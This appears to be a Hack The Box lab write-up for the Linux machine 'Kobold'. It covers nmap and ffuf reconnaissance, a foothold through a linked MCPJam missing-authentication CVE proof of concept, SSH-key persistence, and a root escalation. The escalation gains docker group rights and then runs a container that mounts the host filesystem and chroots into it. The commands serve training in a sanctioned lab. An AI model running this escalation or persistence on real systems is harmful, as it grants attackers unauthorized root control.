---
machineName: Kobold
difficulty: Easy
Status: Done
OS: Linux
start_time: 2026-04-27T23:00:00
end_time: 2026-04-28T01:00:00
player_position: "6519"
CVEs:
  - "[CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)"
CWEs:
  - "[CWE-306](http://cwe.mitre.org/data/definitions/306.html)"
tools:
  - nmap
  - ffuf
  - ZAP
exploited_programs:
  - MCPJam
open_ports:
  - "22"
  - "80"
  - "443"
  - "3552"
aliases:
  - RCE caused by missing authentication -> Direct root access through Docker group
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2ff7f3683782c3525c5ac9ed275cc989.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2ff7f3683782c3525c5ac9ed275cc989.png"
    width="200"
  >
</div>

# Initial Recon

## NMAP
```sh
nmap -sV -sC -p- kobold.htb                                                            
```
```sh                                                                     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-27 23:02 +0200
Nmap scan report for kobold.htb (10.129.43.107)
Host is up (0.016s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Kobold Operations Suite
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
3552/tcp open  http     Golang net/http server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Mon, 27 Apr 2026 21:02:31 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.70 seconds

```

We got two interesting ports: 
- `443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)`
- `3552/tcp open  http     Golang net/http server`

The first one implies there’s a Nginx server, with HTTP over TLS (i.e., HTTPS) so this time we can also run [ffuf](https://github.com/ffuf/ffuf) scans over the `https://` endpoints.

The second port is a golang web server, when visiting we see this login page:
![[Pasted image 20260427230502.png]]

The footer shows us that this is an [Arcane Docker Management Server](https://github.com/getarcaneapp/arcane) version **1.13.0**
I also checked the website at port 80, it is a simple coming soon page, with the following contact info Contact: admin@kobold.htb

For the moment, there’s nothing suspicious, I launched a brute-force attack on the admin@kobold.htb user, while I looked for any more clues, but it didn’t land any more passwords.
## FFUF

```sh
ffuf -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" -w ~/Applications/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -ac               
```
```
________________________________________________

 :: Method           : GET
 :: URL              : https://kobold.htb/
 :: Wordlist         : FUZZ: /home/drope/Applications/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 112ms]
mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 116ms]
:: Progress: [20000/20000] :: Job [1/1] :: 2469 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

![[Pasted image 20260427235106.png]]
![[Pasted image 20260427235140.png]]

So we got these two [VHOST](https://en.wikipedia.org/wiki/Virtual_hosting#Name-based), which I have added to `/etc/hosts`

I identified the two web services as:
- [PrivateBin](https://privatebin.info/) Version 2.0.2
- [MCPJam](https://www.mcpjam.com/)  Version: v1.4.2
## Recap

We got a rather large attack surface with three services:
- [PrivateBin](https://privatebin.info/) Version: 2.0.2
- [MCPJam](https://www.mcpjam.com/)  Version: v1.4.2
- [Arcane](https://github.com/getarcaneapp/arcane) Version: 1.13.0

A possible admin email: **admin@kobold.htb**



# First Foothold
I found this [CVE-2026-23744](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py)PoC, I was trying to exploit it by hand with [zap](https://www.zaproxy.org) but the data in the post request was making me struggle a bit.

After execution, I landed into the **ben** user, I am tired of shitty terminals for today, so I put my [ssh](https://www.openssh.com) public key into the `.ssh/authorized_keys` and connected to him through ssh, then I ran [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) as usual.
## 2nd Recon

I launched a [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) scan as usual:

And saw this:
```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
uid=1002(alice) gid=1002(alice) groups=1002(alice),37(operator),111(docker)
```

## Privilege Escalation

It is pretty clear that we need to exploit the privatebin CVEs to actually get access to alice, and get to root, through his [docker](https://www.docker.com) access, I poked around if I could somehow end up in the docker group, and I tried:

```
newgrp docker
```

which successfully gave me the rights of the [docker](https://www.docker.com) group.

then I simply did the following:
```sh
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
# chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
```


___

For the privilege escalation it was really weird, I didn’t expect it to work so easily with `newgrp docker`, This is clearly not the intended way, I looked quite a long time for an explanation, **ben** is not in part of:
```
cat /etc/group | grep docker
```
But ben is in:
```
# cat /etc/gshadow | grep docker
docker:!::ben,alice
```

which meant I was already part of the [docker](https://www.docker.com) group, I was just not registered to /etc/group, I’ll probably try to check the other ways to pwn this at another time.



# References

- Arcane: https://github.com/getarcaneapp/arcane
- Arcane Docker Management Server: https://github.com/getarcaneapp/arcane
- CVE-2026-23744: https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py
- CWE-306: http://cwe.mitre.org/data/definitions/306.html
- MCPJam: https://www.mcpjam.com/
- PrivateBin: https://privatebin.info/
- VHOST: https://en.wikipedia.org/wiki/Virtual_hosting#Name-based
- docker: https://www.docker.com
- ffuf: https://github.com/ffuf/ffuf
- linpeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- ssh: https://www.openssh.com
- zap: https://www.zaproxy.org
